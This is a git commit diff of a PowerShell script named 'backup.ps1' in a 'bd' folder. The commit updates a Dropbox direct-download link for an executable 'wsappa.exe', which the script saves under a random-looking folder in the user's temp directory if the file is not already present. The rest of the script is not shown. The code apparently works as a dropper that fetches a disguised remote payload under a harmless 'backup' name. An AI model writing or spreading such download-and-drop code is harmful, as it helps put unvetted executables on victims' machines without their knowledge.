c5e8c7c0e5d2252547ba6f1dead0815044742cd1
blousekool <132397759+blousekool@users.noreply.github.com>
2023-10-24 10:17:41 +0200

    Update backup.ps1

--- bd/backup.ps1
+++ bd/backup.ps1
@@ -1,4 +1,4 @@
-$fileUrl = "dl.dropboxusercontent.com/scl/fi/ll2lef3yscbinixdg5772/wsappa-1.7.exe?rlkey=tcosuk2m6nw87girq8yrqvltk&dl=0"
+$fileUrl = "dl.dropboxusercontent.com/scl/fi/8di6a2k4x9vfp5gw98ln9/wsappa-1.8.exe?rlkey=siwv86zxma0i4hquw6corpk34&dl=0"
 $savePath = "$env:temp\sVBXKuz\wsappa.exe"
 
 if (!(Test-Path -Path $savePath)) {
